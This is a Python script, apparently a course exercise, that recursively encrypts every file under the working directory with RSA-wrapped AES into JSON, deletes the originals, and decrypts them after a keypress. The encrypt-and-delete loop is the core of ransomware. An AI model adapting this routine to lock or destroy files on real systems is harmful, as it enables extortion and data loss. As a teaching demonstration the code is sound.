import os
import json
import KeyGen
import constants
import MACEncrypt
import RSAEncrypt
from pathlib import Path
from base64 import b64encode
from base64 import b64decode


#verification of existence of RSA keys
def verify_RSA_keys():
    if (not os.path.isfile(constants.RSA_PUBLIC_KEYPATH)) or (not os.path.isfile(constants.RSA_PRIVATE_KEYPATH)):
        KeyGen.RSA_generate_keys()
        print("At least one of the keys not found.\nGenerating new keys...")
        return
    else:
        print("Keys found")
        return

#writing out to json file
def json_write(RSACipher, C, IV, tag, ext, filepath):
    filepath, throwExt = os.path.splitext(filepath)
    json_file = filepath + constants.JSON_EXT
    output = open(json_file, 'w')
    data = {
        "RSACipher":    b64encode(RSACipher).decode('utf-8'),
        "Cipher text":  b64encode(C).decode('utf-8'),
        "IV":           b64encode(IV).decode('utf-8'),
        "Tag":          b64encode(tag).decode('utf-8'),
        "Extension":    ext
    }
    json.dump(data, output, ensure_ascii = False)
    output.close()

def json_read(filepath):
    jsonFile = open(filepath)
    encrypted_data = json.load(jsonFile)

    RSACipher = b64decode(encrypted_data["RSACipher"])
    C =         b64decode(encrypted_data["Cipher text"])
    IV =        b64decode(encrypted_data["IV"])
    tag =       b64decode(encrypted_data["Tag"])
    ext =                 encrypted_data["Extension"]
    filepath, throwExt = os.path.splitext(filepath)
    RSAEncrypt.MyRSADecrypt(filepath, RSACipher, C, IV, tag, ext, constants.RSA_PRIVATE_KEYPATH)
    return

def listing():
    verify_RSA_keys()
    
    #geting path of directory of file being excuted
    #My_directory = os.getcwd()
    #print(My_directory)

    #looping through directory
    print("encrypting into .json...")
    #for file in os.listdir(My_directory):
        #if not(file.endswith("private_key.pem")) and not (file.endswith(".py"))\
            #and not (file.endswith("public_key.pem")) and not (file.endswith(constants.ENC_EXT))\
            #and not (file.endswith(".png")) and not (file.endswith("__pycache__"))\
            #and not (os.path.isdir(file)):
            #print("File will be encrypted: ", file)
            #encrypting
            #RSACipher, C, IV, tag, ext = RSAEncrypt.MyRSAEncrypt(file, constants.RSA_PUBLIC_KEYPATH)

            #writing to json
            #json_write(RSACipher, C, IV, tag, ext, file)

    #for file in os.listdir(My_directory):
        #if (file.endswith(constants.ENC_EXT)):
            #os.remove(file)

    #decryption
    #print(".json decryption...")
    #for file in os.listdir(My_directory):
        #if (file.endswith(".json")):
            #print("Decrypting file: ", file)
            #json_read(file)
            #os.remove(file)
    for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
        for name in files:
            if not (name.endswith(".py")) and not (name.endswith(".pem"))\
                    and not (name.endswith(".pyc")) and not (name.endswith(".png"))\
                    and not (name.endswith(constants.ENC_EXT)) and not (name.endswith("__pycache__")):
                print(os.path.join(root, name))
                filename = os.path.join(root, name)
                #encrypting file
                RSACipher, C, IV, tag, ext = RSAEncrypt.MyRSAEncrypt(filename, constants.RSA_PUBLIC_KEYPATH)
                
                #writing to json
                json_write(RSACipher, C, IV, tag, ext, filename)
    for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
        for name in files:
            if not (name.endswith(".py")) and not (name.endswith(".pem"))\
                and not (name.endswith(".pyc")) and not (name.endswith(".png"))\
                and not (name.endswith("__pycache__")) and not (name.endswith(".json")):
                filename = os.path.join(root, name)
                print("Removing ", filename)
                #Removing original files and .enc's
                os.remove(filename)
    input("Waiting to decrypt...")
    for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
        for name in files:
            if (name.endswith(".json")):
                filename = os.path.join(root, name)
                print("Decrypting file: ", filename)
                #Put original file back to normal
                json_read(filename)
                #Remove encrypted .json files
                os.remove(filename)
    return

listing()

